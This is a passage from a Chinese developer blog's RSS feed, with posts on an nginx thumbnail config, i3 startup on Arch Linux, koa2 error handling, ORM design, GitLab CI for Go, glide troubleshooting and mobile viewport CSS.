    proxy_store_access   user:rw  group:r  all:r;
    proxy_temp_path      /tmp/image;
}

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#29983;&#25104;&#32553;&#30053;&#22270;</span>
<span style="color: #81a2be;">location /_thumbnail</span> {
    alias /data/image/;
    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#25351;&#23450;&#35201;&#32553;&#25918;&#30340;&#23485;&#12289;&#39640;&#65292;"-" &#34920;&#31034;&#31561;&#27604;&#20363;&#32553;&#25918;</span>
    image_filter resize 400 <span style="color: #8abeb7;">"-"</span>;
    image_filter_jpeg_quality 75;
    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#35774;&#32622;&#33021;&#22788;&#29702;&#30340;&#26368;&#22823;&#21407;&#22987;&#22270;&#29255;&#25991;&#20214;&#65292;&#40664;&#35748; 1MB &#22826;&#23567;&#20102;</span>
    image_filter_buffer 20M;
    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#25298;&#32477;&#22806;&#37096;&#30452;&#25509;&#35775;&#38382;</span>
    allow 127.0.0.0/8;
    deny all;
}
</pre>
</div>

<dl class="org-dl">
<dt><code>/data/image/</code></dt><dd>原始图片存放目录</dd>

<dt><code>/data/thumbnail</code></dt><dd><p>
缩略图存放目录
</p>

<p>
需确保 nginx worker 进程有写入权限
</p>
<div class="org-src-container">
<pre class="src src-sh">chown nginx:nginx /data/thumbnail
</pre>
</div></dd>

<dt><code>/tmp/image</code> </dt><dd>生成缩略图时的临时目录</dd>
</dl>


<p>
访问原始图片： <code>http://127.0.0.1/image/test.jpeg</code>
</p>

<p>
访问缩略图片： <code>http://127.0.0.1/thumbnail/test.jpeg</code>
</p>
</div>
</div>

<div id="outline-container-orgcf9656b" class="outline-2">
<h2 id="orgcf9656b">参考</h2>
<div class="outline-text-2" id="text-orgcf9656b">
<ul class="org-ul">
<li><a href="http://nginx.org/en/docs/http/ngx_http_image_filter_module.html#image_filter">Module ngx_http_image_filter_module</a></li>
</ul>


<ul class="org-ul">
<li><a href="https://gist.github.com/phpdude/1451684">Nginx image filter + caching of results</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux 下 i3 桌面启动]]></title>
            <link>/article/archlinux-4e0b-i3-684c9762542f52a8.html</link>
            <guid>/article/archlinux-4e0b-i3-684c9762542f52a8.html</guid>
            <pubDate>Wed, 30 Aug 2017 06:11:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org902b147" class="outline-2">
<h2 id="org902b147">不使用 gdm</h2>
<div class="outline-text-2" id="text-org902b147">
<ul class="org-ul">
<li><p>
设置 archlinux 为文本模式启动
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo systemctl set-default multi-user.target
</pre>
</div></li>
</ul>


<ul class="org-ul">
<li><p>
在 ~/.xinitrc 中添加以下内容运行 i3
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b5bd68;">exec</span> dbus-launch i3
</pre>
</div></li>
</ul>


<ul class="org-ul">
<li><p>
配置 ~/.bash_profile 中添加以下内容运行 startx
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b5bd68;">if</span> [ -z <span style="color: #8abeb7;">"$DISPLAY"</span> ] &amp;&amp; [ -n <span style="color: #8abeb7;">"$XDG_VTNR"</span> ] &amp;&amp; [ <span style="color: #8abeb7;">"$XDG_VTNR"</span> -eq 1 ]; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">exec</span> startx
<span style="color: #b5bd68;">fi</span>
</pre>
</div></li>
</ul>

<p>
经过以上设置，首先通过文本模式启动 Archlinux，在 tty1 输入用户名及密码后，进入 i3 桌面。
</p>
</div>
</div>

<div id="outline-container-org9003e88" class="outline-2">
<h2 id="org9003e88">恢复为使用 gdm</h2>
<div class="outline-text-2" id="text-org9003e88">
<ul class="org-ul">
<li><p>
设置 archlinux 为图形模式启动
</p>

<div class="org-src-container">
<pre class="src src-sh">systemctl enable gdm
sudo systemctl set-default graphical.target
</pre>
</div></li>
</ul>


<ul class="org-ul">
<li><p>
注释之前在 ~/.xinitrc 中添加的内容
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">exec dbus-launch i3</span>
</pre>
</div></li>

<li><p>
注释之前在 ~/.bash_profile 中添加的内容
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">if [ -z "$DISPLAY" ] &amp;&amp; [ -n "$XDG_VTNR" ] &amp;&amp; [ "$XDG_VTNR" -eq 1 ]; then</span>
<span style="color: #969896; font-style: italic;">#   </span><span style="color: #969896; font-style: italic;">exec startx</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">fi</span>
</pre>
</div></li>
</ul>

<p>
经过以上设置，首先通过图形模式启动 Archlinux，第一次需在 gdm 登录界面选择桌面为 i3，输入用户名及密码后进入 i3 桌面。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[koa2 默认的处理]]></title>
            <link>/article/koa2-9ed88ba4768459047406.html</link>
            <guid>/article/koa2-9ed88ba4768459047406.html</guid>
            <pubDate>Sun, 27 Aug 2017 10:05:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
koa2 简单易用，代码量少且易读，代码实现中有大量“经验法则”，了解这些才能用好它。
</p>

<div id="outline-container-orgc294c1a" class="outline-2">
<h2 id="orgc294c1a">默认的响应处理</h2>
<div class="outline-text-2" id="text-orgc294c1a">
<ul class="org-ul">
<li><code>req.statusCode</code> 默认值为 404</li>
</ul>


<ul class="org-ul">
<li><p>
为 <code>response.body</code> 赋值时
</p>

<p>
如果赋 null 值，将 <code>response.status</code> 置为 <code>204</code> ；
</p>

<p>
如果之前没有通过为 <code>response.status</code> 赋值的方式设置状态码，则将 <code>response.status</code> 置为 <code>200</code> ；
</p>

<p>
如果之前没有设置 <code>content-type</code> 头，则根据值的内容推算出 <code>content-type</code> （默认为 <code>json</code> ），
</p>

<p>
如：内容是 <code>string</code> 类型，以 <code>&lt;</code> 开头则认为是 <code>html</code> 否则是 <code>text</code> 。
</p></li>
</ul>


<ul class="org-ul">
<li>响应码为 204、205、304 时强制 <code>response.body</code> 为空</li>
</ul>
</div>
</div>


<div id="outline-container-org7b70e40" class="outline-2">
<h2 id="org7b70e40">默认的异常处理</h2>
<div class="outline-text-2" id="text-org7b70e40">
<p>
koa2 在中间件的最外层会捕获异常，将它转化为合适的 HTTP 错误响应：
</p>

<ul class="org-ul">
<li>向 <code>app</code> 发送 <code>error</code> 事件，而 <code>app</code> 的处理则是输出日志到控制台</li>

<li>如果 HTTP 响应头已经发送，则不走下面的流程，不做任何处理</li>

<li>清空 HTTP 响应头</li>

<li>设置响应头为 <code>err.headers</code></li>

<li><code>err.code</code> 为 <code>ENOENT</code> 时设置 <code>err.status</code> 为 <code>404</code></li>

<li><code>err.status</code> 为无效的 HTTP 状态码时修复为 <code>500</code></li>

<li><code>err.status</code> 做为 HTTP 状态码</li>

<li><code>err.expose</code> 为真时使用 <code>err.message</code> 做为 HTTP 响应体，否则使用 <code>err.status</code> 对应的文本描述做为 HTTP 响应体</li>
</ul>
</div>
</div>

<div id="outline-container-org8393afd" class="outline-2">
<h2 id="org8393afd">自定义异常处理</h2>
<div class="outline-text-2" id="text-org8393afd">
<ul class="org-ul">
<li><p>
自定义日志输出
</p>

<p>
如：使用 <code>bunyan</code> 来输出日志
</p>

<div class="org-src-container">
<pre class="src src-js">app.on(<span style="color: #8abeb7;">'error'</span>, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">ctx</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   logger.error({
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   stack: err.stack,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ctx: ctx
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }, <span style="color: #8abeb7;">"service error"</span>);
});
</pre>
</div></li>

<li><p>
自定义异常响应
</p>

<p>
如：总是响应 <code>json</code> ，格式为 <code>{ message: "错误描述" }</code>
</p>

<div class="org-src-container">
<pre class="src src-js">app.use(<span style="color: #b5bd68;">async</span> (ctx, next) =&gt; {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">try</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">await</span> next();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   } <span style="color: #b5bd68;">catch</span> ( err ) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ctx.app.emit(<span style="color: #8abeb7;">'error'</span>, err, ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ctx.status = err.status || 500;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ctx.body = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   message: err.expose ? err.message : ctx.message
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   };
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (ctx.status == 404) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (!ctx.body || !ctx.body.message) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">explicitly set status, avoid revert to 200 when assign body.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ctx.status = 404;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ctx.body = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   message: ctx.message
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   };
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
})
</pre>
</div></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[数据库中的数据带来的诱惑]]></title>
            <link>/article/6570636e5e934e2d76846570636e5e26676576848bf160d1.html</link>
            <guid>/article/6570636e5e934e2d76846570636e5e26676576848bf160d1.html</guid>
            <pubDate>Mon, 31 Jul 2017 10:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
平常开发的后台服务会有一个数据库在最底层，而最外层对客户端提供一个 Restful 接口。
</p>

<p>
在这两个层次中会定义最重要的数据结构：
</p>

<ul class="org-ul">
<li>数据库表结构</li>

<li>HTTP 请求响应体的结构</li>
</ul>

<p>
这两个层次中的相同事务往往会定义地非常相似，我们会忍不住共用它们，或者是强烈地渴望它们保持一致。这带了的一个好处是形式上很优美（统一就是美），还有就是中间不需要做任何处理或适配，客户端请求中的数据可以直接用于数据库操作，数据库中取出的数据可以直接用于响应客户端请求。ORM（Object relational mapping）就是这种思想的产物，《<a href="https://rrees.me/2007/12/12/orm-is-evil/">ORM is evil | Echo One</a>》一文对这种想法进行了驳斥：
</p>

<blockquote>
<p>
Worse, it allows people to not think of database as being a collection of, y’know, relational data but instead as being a list of entities. 
</p>

<p>
&#x2026;
</p>

<p>
The biggest problem with programmers seeing the database through the ORM reality-distortion filter is that they start thinking that the entities they deal with are the data. In most cases that simply isn’t true, or if it is it is because the entities have started to become some kind of uber-object that contains everything about everything.
</p>

<p>
&#x2026;
</p>

<p>
  You use queries to constitute a coherent and logical projection of the underlying data that
can be defined by the purpose the data is going to be used for.
</p>

<p>
&#x2026;
</p>

<p>
ORM should see itself as just being one consumer of data and learn to play better with
others. It should be about the convenience of presenting one valid method of data
modelling in a form that is more familiar to programmers. It should take away any
impedance due to having to comprehend the relational model (which I admit is hard) but it
should leave it there and stop thinking that is the true answer to complex data issues.  
</p>

<p>
太坏了，它让人意识不到数据库是关系数据的集合，误以为是实体的集合。
</p>

<p>
&#x2026;
</p>

<p>
最大的问题是程序员透过 ORM 的变形滤镜去看数据库后，
</p>

<p>
会认为数据库中的数据就是要处理的实体。
</p>

<p>
大多数情况下这不是真的，或这些“实体”成了包罗万象的对象。
</p>

<p>
&#x2026;
</p>

<p>
你应该针对数据的用途，从数据库中查询出相应的内聚逻辑实体。
</p>

<p>
&#x2026;
</p>

<p>
ORM 应该将自已看做是众多的数据消费者中的一个，学会和其它消费者共存。
</p>

<p>
要意思到 ORM 只是便捷而有效的一种数据建模方式，被程序员所熟知。
</p>

<p>
ORM 需要理解关系模型，会对数据库设计本身带来了阻力，这是不应该的，
</p>

<p>
面对复杂数据这一难题，不要指望 ORM。
</p>
</blockquote>

<p>
我们应该意识到数据库中的数据和客户端需要的“数据”是不同的，数据库中的数据就像你放在冰箱里的食材，而用户想要的是丰盛的大餐，而后台服务需要根据客户的要求利用数据库中的食材做出一道道大餐。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[gitlab 针对 go 项目做持续集成]]></title>
            <link>/article/gitlab-94885bf9-go-987976ee505a63017eed96c66210.html</link>
            <guid>/article/gitlab-94885bf9-go-987976ee505a63017eed96c66210.html</guid>
            <pubDate>Wed, 26 Jul 2017 11:05:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<code>gitlab</code> 内置支持持续集成（CI），但是 <code>go</code> 有一点比较特殊，依赖 <code>$GOPATH</code> ，特别是使用了 <code>glide</code> 来管理包依赖后， <code>vendor</code> 目录必须在 <code>$GOPATH</code> 下，这就要求 <code>gitlab</code> 拉取项目源代码的位置符合 <code>$GOPATH</code> 的目录结构。
</p>

<p>
但是 <code>gitlab</code> 拉取代码后的目录结构类似 <code>/home/gitlab-runner/builds/6913a759/0/myproject</code> ，必须将 <code>myproject</code> 置于 <code>src</code> 目录下才符合 <code>$GOPATH</code> 约定。
</p>

<p>
《<a href="https://misfra.me/2016/12/26/gitlab-ci-go/">GitLab CI with Go</a>》给出的方案是将拉取的代码移到 <code>$GOPATH</code> 下的正确位置上，再进行 <code>glide</code> 操作以及跑编译和测试，这篇文章提供了示例配置文件 <code>.gitlab-ci.yml</code> ，但有以下几个问题需要解决：
</p>

<ul class="org-ul">
<li><p>
<code>mv</code> 操作默认是不会移动隐藏目录（如： <code>.git</code> ）到目标位置的，这会导致后面的任务拉取代码失败
</p>

<p>
可以开启 <code>bash</code> 的选项 <code>dotglob</code> 让 <code>*</code> 匹配隐藏文件
</p></li>

<li><p>
文件移动到目标位置后，没有清理机制，会影响下一任务
</p>

<p>
将 <code>gitlab</code> 的 <code>GIT_STRATEGY</code> 变量配置为 <code>fetch</code> ，它会在拉取代码后执行 <code>git
    clean</code> 将未知的文件删除，如果我们将移动后的代码放在原来的位置下就可以做到自
动清除没有负作用了。
</p></li>

<li><p>
缓存 <code>vendor</code> 目录
</p>

<p>
<code>glide update</code> 会更新 Go 项目依赖，比较耗时，构建有 <code>build</code> <code>test</code> <code>deploy</code>
等多个阶段，缓存 <code>vendor</code> 目录能够会快很多。这些阶段会依次执行，同阶段的多个
任务是并行的，可以将 <code>build</code> 阶段的工作目录状态保留到其它阶段，可以用
<code>cache</code> 来实现，也可以将除了 <code>build</code> 阶段以外的其它阶段的 <code>GIT_STRATEGY</code> 置
为 <code>none</code> 来实现。
</p></li>

<li><p>
创建 docker 镜像
</p>

<p>
安装完 <code>gitlab-runner</code> 后要将 <code>gitlab-runner</code> 用户加入到 <code>docker</code> 用户组，这
样才可调用 <code>docker</code> 工具。
</p>

<div class="org-src-container">
<pre class="src src-sh">usermod gitlab-runner -a -G docker
</pre>
</div>

<p>
不要在 <code>.gitlab-ci.yml</code> 中直接写死 docker 帐号和密码，而是引用环境变量，在
<code>~gitlab-runner/.bashrc</code> 中设置环境变量
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">DOCKER_REGISTRY</span>=gitlab.xxxxxx.com
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">DOCKER_USER</span>=xxx@xxxxxx.com
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">DOCKER_PASSWORD</span>=xxxxxxxx
</pre>
</div>

<p>
docker 镜像按照简单的约定：
</p>

<ul class="org-ul">
<li><p>
git 打 tag 时打一个镜像，做为发布镜像
</p>

<p>
之前一直想实现仅当 <code>master</code> 分支打 <code>tag</code> 时才创建镜像，但是实现起来会很麻
烦，因为 git 的 tag 只是 commit 的引用，与具体的 branch 无关，tags 和
branchs 是平级的概念。
</p>

<p>
相关讨论 <a href="https://gitlab.com/gitlab-org/gitlab-ce/issues/27818">Update `.gitlab-ci.yml` to support conjunction logic for build conditions (#27818)</a>
</p></li>

<li><code>dev</code> 开头的分支进行代码提交时打一个镜像，做为测试镜像</li>
</ul></li>
</ul>

<div id="outline-container-org6acde09" class="outline-2">
<h2 id="org6acde09">示例配置：</h2>
<div class="outline-text-2" id="text-org6acde09">
<p>
<code>.gitlab-ci.yml</code>
</p>
<div class="org-src-container">
<pre class="src src-yaml"><span style="color: #f0c674;">variables</span>:
  <span style="color: #f0c674;">REPO_NAME</span>: gitlab.example.com/mygroup/myproject
  <span style="color: #f0c674;">BIN_NAME</span>: mygroup.myproject

<span style="color: #f0c674;">before_script</span>:
  - go version
  - protoc --version
  - echo $CI_BUILD_REF
  - echo $CI_PROJECT_DIR
  - if [ ! -d <span style="color: #8abeb7;">"${CI_PROJECT_DIR}/src/$REPO_NAME"</span> ];
    then
      mkdir -p ${CI_PROJECT_DIR}.src.tmp/$REPO_NAME;
      shopt -s dotglob;
      mv $CI_PROJECT_DIR/* ${CI_PROJECT_DIR}.src.tmp/$REPO_NAME/;
      mv ${CI_PROJECT_DIR}.src.tmp ${CI_PROJECT_DIR}/src;
      echo <span style="color: #8abeb7;">"${CI_PROJECT_DIR}/src/$REPO_NAME created"</span>;
    fi
  - export GOPATH=$CI_PROJECT_DIR
  - cd $GOPATH/src/$REPO_NAME

<span style="color: #f0c674;">build</span>:
  <span style="color: #f0c674;">stage</span>: build
  <span style="color: #f0c674;">variables</span>:
    <span style="color: #f0c674;">GIT_STRATEGY</span>: fetch
  <span style="color: #f0c674;">script</span>:
    - make

<span style="color: #f0c674;">test</span>:
  <span style="color: #f0c674;">stage</span>: test
  <span style="color: #f0c674;">variables</span>:
    <span style="color: #f0c674;">GIT_STRATEGY</span>: none
  <span style="color: #f0c674;">script</span>:
    - go test -v

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Build docker image for development when any branch named begin with "dev"</span>
<span style="color: #f0c674;">deploy-dev</span>:
  <span style="color: #f0c674;">stage</span>: deploy
  <span style="color: #f0c674;">variables</span>:
    <span style="color: #f0c674;">GIT_STRATEGY</span>: none
  <span style="color: #f0c674;">only</span>:
    - /^dev.*/@mygroup/myproject
  <span style="color: #f0c674;">except</span>:
    - tags
  <span style="color: #f0c674;">script</span>:
    - VERSION=${CI_COMMIT_REF_NAME} make
    - docker build ./ -t ${REPO_NAME}/${BIN_NAME}:${CI_COMMIT_REF_NAME}
    - docker login ${DOCKER_REGISTRY} -u ${DOCKER_USER} -p ${DOCKER_PASSWORD}
    - docker push ${REPO_NAME}/${BIN_NAME}:${CI_COMMIT_REF_NAME}

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Build docker image for production when pushed a tag</span>
<span style="color: #f0c674;">deploy</span>:
  <span style="color: #f0c674;">stage</span>: deploy
  <span style="color: #f0c674;">variables</span>:
    <span style="color: #f0c674;">GIT_STRATEGY</span>: none
  <span style="color: #f0c674;">only</span>:
    - tags@mygroup/myproject
  <span style="color: #f0c674;">script</span>:
    - VERSION=${CI_COMMIT_REF_NAME} make
    - docker build ./ -t ${REPO_NAME}/${BIN_NAME}:${CI_COMMIT_REF_NAME}
    - docker login ${DOCKER_REGISTRY} -u ${DOCKER_USER} -p ${DOCKER_PASSWORD}
    - docker push ${REPO_NAME}/${BIN_NAME}:${CI_COMMIT_REF_NAME}
</pre>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[glide get 出错（Failed to checkout packages: Cannot detect VCS）问题排查]]></title>
            <link>/article/glide-get-51fa9519ff08-failed-to-checkout-packages-cannot-detect-vcs-ff0995ee9898639267e5.html</link>
            <guid>/article/glide-get-51fa9519ff08-failed-to-checkout-packages-cannot-detect-vcs-ff0995ee9898639267e5.html</guid>
            <pubDate>Fri, 21 Jul 2017 12:30:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
突然间使用 <code>glide get</code> 开始出错，错误信息为
</p>

<blockquote>
<p>
Failed to checkout packages: Cannot detect VCS
</p>
</blockquote>

<p>
研究了一下 glide 的源代码，定位到 <code>vcs_remote_lookup.go</code> 中 <code>detectVcsFromRemote</code> 函数，
当我们使用 <code>glide get golang.org/x/net</code> 时，会下载 "<a href="https://golang.org/x/net">https://golang.org/x/net</a>" 页面，并从中解析出代码所在的确切位置，
如果 <code>golang.org</code> 被墙或网络不稳定就会报这个错，可以使用 <code>curl</code> 进行验证。
</p>

<p>
正常情况下：
</p>
<pre class="example">
$ curl https://golang.org/x/net
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"/&gt;
&lt;meta name="go-import" content="golang.org/x/net git https://go.googlesource.com/net"&gt;
&lt;meta name="go-source" content="golang.org/x/net https://github.com/golang/net/ https://github.com/golang/net/tree/master{/dir} https://github.com/golang/net/blob/master{/dir}/{file}#L{line}"&gt;
&lt;meta http-equiv="refresh" content="0; url=https://godoc.org/golang.org/x/net"&gt;
&lt;/head&gt;
&lt;body&gt;
Nothing to see here; &lt;a href=" "&gt;move along&lt;/a &gt;.
&lt;/body&gt;
&lt;/html&gt;  
</pre>

<p>
网络不稳定时：
</p>
<pre class="example">
$ curl https://golang.org/x/net
curl: (7) Failed to connect to golang.org port 443: Connection timed out
</pre>

<p>
对于这种问题只能是等待网站恢复正常访问，紧急情况下，可以修改 <code>glide.yaml</code> ，
在相应 package 下手工指定 <code>repo</code> 为具体的代码仓库地址，如：
</p>
<pre class="example">
- package: golang.org/x/net
  repo: https://go.googlesource.com/net
  vcs: git
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[从PC端过渡到移动端网页设计]]></title>
            <link>/article/4ece-pc-7aef8fc76e21523079fb52a87aef7f5198758bbe8ba1.html</link>
            <guid>/article/4ece-pc-7aef8fc76e21523079fb52a87aef7f5198758bbe8ba1.html</guid>
            <pubDate>Tue, 25 Apr 2017 12:34:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org0f71d58" class="outline-2">
<h2 id="org0f71d58">PC端网页设计</h2>
<div class="outline-text-2" id="text-org0f71d58">
<p>
2013年的时候，有做过资讯展示类的网站，我们会把网页内容宽度定为 <code>980px</code> 左右并居中：
</p>

<div class="org-src-container">
<pre class="src src-css"><span style="color: #de935f;">#main </span>{
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">width</span>: 980px;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">margin</span>: 0 auto;
}
</pre>
</div>

<p>
这里因为当时的主流的电脑屏幕分辨率为 <code>1024x768</code> ，而现在 <code>1920x1080</code> 甚至 <code>2K</code> 屏都很常见了，有的网站开始设置更大的内容宽度。
</p>

<p>
前面 CSS 中的 <code>px</code> 是 <code>pixels</code> 的简称，即 CSS 像素，是WEB编程使用的一种逻辑像素；另一种则是设备像素（device pixel），也称为物理像素或屏幕分辨率；在PC端，往往 CSS 像素和设备像素是 <code>1:1</code> 的关系。
</p>

<p>
但是，当我们用手机浏览器打开这些网站，会惊讶地发现网页布局和PC端浏览器下一致，只是由于手机屏幕尺寸太小，文字需要手工放大才能看清。
</p>

<p>
其实手机浏览器只是做了一个简单处理：
</p>

<blockquote>
<p>
假定网页是 <code>980px</code> 然后按一定比率缩放到手机屏幕宽度
</p>
</blockquote>

<p>
这样手机浏览器可以展示绝大多数针对PC设计的网站。
</p>
</div>
</div>

<div id="outline-container-org03d19de" class="outline-2">
<h2 id="org03d19de">移动端网页设计</h2>
<div class="outline-text-2" id="text-org03d19de">
<p>
前面所述的手机浏览器对PC端网页做的处理，用 <code>viewport</code> 来表示，默认值类似下面这样：
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #de935f;">meta</span> <span style="color: #f0c674;">name</span>=<span style="color: #8abeb7;">"viewport"</span> <span style="color: #f0c674;">content</span>=<span style="color: #8abeb7;">"width=980"</span> /&gt;
</pre>
</div>

<p>
<code>initial-scale</code> 的值自动进行计算，手机浏览器默认的字体大小为 <code>16px</code> ，看起来会很小。
</p>

<p>
可以为网页指定适用于手机端展示的 <code>viewport</code> ：
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #de935f;">meta</span> <span style="color: #f0c674;">name</span>=<span style="color: #8abeb7;">"viewport"</span> <span style="color: #f0c674;">content</span>=<span style="color: #8abeb7;">"width=device-width, initial-scale=1.0"</span> /&gt;
</pre>
</div>

<p>
我手上的 “魅蓝 NOTE 5” 屏幕为 <code>5.5</code> 英寸、分辨率 <code>1920x1080</code> ，系统自带浏览器获得的设备像素比率为 <code>3</code> ，竖屏时 CSS 像素表示的屏幕宽度（ <code>screen.width</code> ）为 <code>360px</code> （即 <code>1080/3=360</code> ），默认的字体大小（ <code>16px</code> ）视觉上看起来正好。
</p>

<p>
可以采用以下方式适配手机屏幕
</p>

<ul class="org-ul">
<li><p>
指定适用于手机端的 <code>viewport</code>
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #de935f;">meta</span> <span style="color: #f0c674;">name</span>=<span style="color: #8abeb7;">"viewport"</span> <span style="color: #f0c674;">content</span>=<span style="color: #8abeb7;">"width=device-width, initial-scale=1.0"</span> /&gt;
</pre>
</div></li>

<li><p>
使用媒体查询适配常见尺寸的手机
</p>

<p>
如下只改变默认的字体大小，其它地方都使用 <code>rem</code> 单位以实现自适应，同时根据屏幕尺寸调整页面布局。
</p>

<div class="org-src-container">
<pre class="src src-css"><span style="color: #b294bb;">@media</span> screen and (max-width:760px){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>  <span style="color: #de935f;">html </span>{ <span style="color: #b5bd68;">font-size</span>: 66.5%; }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>  <span style="color: #de935f;">#sidebar </span>{ <span style="color: #b5bd68;">float</span>: left; <span style="color: #b5bd68;">width</span>: 8rem; }
}
<span style="color: #b294bb;">@media</span> screen and (max-width:360px){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>  <span style="color: #de935f;">html </span>{ <span style="color: #b5bd68;">font-size</span>: 50%; }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>  <span style="color: #de935f;">#sidebar </span>{ <span style="color: #b5bd68;">float</span>: none; <span style="color: #b5bd68;">width</span>: 100%; }
}
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org202391b" class="outline-2">
<h2 id="org202391b">参考</h2>
<div class="outline-text-2" id="text-org202391b">
<p>
<a href="http://www.cnblogs.com/2050/p/3877280.html">移动前端开发之viewport的深入理解 - 无双 - 博客园</a>
</p>

<p>
<a href="http://isux.tencent.com/mobile-development-essential-knowledge.html">移动终端开发必备知识 - 前端技术 - 腾讯ISUX</a>
</p>

<p>
<a href="http://shizisongsong.iteye.com/blog/2115278">响应式Web设计：Media Queries和Viewport的困惑 - - ITeye技术网站</a>
</p>

<p>
<a href="https://www.mydevice.io/">mydevice.io : web devices capabilities</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[微信公众号本地开发环境配置]]></title>
            <link>/article/5fae4fe1516c4f1753f7672c57305f0053d173af5883914d7f6e.html</link>
            <guid>/article/5fae4fe1516c4f1753f7672c57305f0053d173af5883914d7f6e.html</guid>
            <pubDate>Mon, 24 Apr 2017 07:44:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org8167d50" class="outline-2">
<h2 id="org8167d50">微信公众后台开发要求</h2>
<div class="outline-text-2" id="text-org8167d50">
<p>
